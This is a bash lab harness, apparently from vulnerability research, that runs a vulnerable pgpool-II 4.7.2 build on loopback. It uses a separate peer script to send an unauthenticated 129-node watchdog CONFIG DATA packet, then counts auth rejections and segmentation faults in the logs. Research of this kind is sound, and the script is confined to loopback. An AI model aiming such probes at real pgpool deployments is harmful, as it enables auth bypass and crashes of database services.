#!/bin/bash
# W11 probe: does a non-authenticating loopback WD_POOL_CONFIG_DATA ('Z') peer
# still reach get_pool_config_from_json() when wd_authkey is configured?
# Loopback only; kills only PIDs it started. Single case: vuln 4.7.2, N=129,
# wd_authkey='labsecret', peer sends no auth key.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="${TMPDIR:-/tmp}/w108-pgpool-replay"
VULN="$WORK/pgpool-II-4.7.2/src/pgpool"
CONF="$HERE/pgpool-w9-auth.conf"
DAEMONLOG=/tmp/w9-auth-pgpool.log
OUT="$HERE/evidence-auth-n129"

if [ ! -x "$VULN" ]; then
    echo "build pinned trees first: bash lab/frontier/pgpool2shell/harness/run.sh" >&2
    exit 2
fi
python3 - <<'PY' || exit 2
import socket
for port in (19003, 19004, 19005, 19006):
    s = socket.socket()
    s.settimeout(0.3)
    rc = s.connect_ex(("127.0.0.1", port))
    s.close()
    if rc == 0:
        print(f"port {port} busy; refusing to start", flush=True)
        raise SystemExit(1)
PY

printf '0\n' > "$HERE/pgpool_node_id"
rm -f "$OUT.stdout" "$OUT.peer" "$DAEMONLOG" /tmp/w9-auth-pgpool.pid
python3 "$HERE/peer.py" 129 0x42424242 20 wxyzUUUUUUUU >"$OUT.peer" 2>&1 &
peer=$!
sleep 0.3
"$VULN" -n -D -f "$CONF" >"$OUT.stdout" 2>&1 &
pgpool=$!
sleep 21

echo "=== authkey-set probe: vuln 4.7.2, wd_nodes N=129, wd_authkey='labsecret', peer sends no key ==="
parse=$(grep -c 'invalid watchdog JSON payload' "$DAEMONLOG" 2>/dev/null || true)
cfg=$(grep -c 'type:\[CONFIG DATA\]' "$OUT.stdout" 2>/dev/null || true)
numwd=$(grep -c 'configured with 129 watchdog nodes' "$OUT.stdout" 2>/dev/null || true)
authrej=$(grep -c -i 'auth.*fail\|fail.*auth\|mismatch.*auth\|different.*authkey' "$OUT.stdout" "$DAEMONLOG" 2>/dev/null | awk -F: '{s+=$NF} END{print s+0}')
crash=$(grep -c 'terminated by segmentation fault' "$OUT.stdout" 2>/dev/null || true)
echo "TAG=auth-n129 CONFIG_DATA=$cfg num_wd129=$numwd invalid_json=$parse auth_reject=$authrej segfault=$crash"
grep -E 'CONFIG DATA|watchdog nodes|invalid watchdog JSON|auth|different|segmentation fault' "$OUT.stdout" "$DAEMONLOG" 2>/dev/null | tail -30 || true

kill "$pgpool" 2>/dev/null || true
sleep 1
kill -9 "$pgpool" 2>/dev/null || true
kill "$peer" 2>/dev/null || true
wait 2>/dev/null || true
cp "$DAEMONLOG" "$OUT.daemon" 2>/dev/null || true
echo DONE
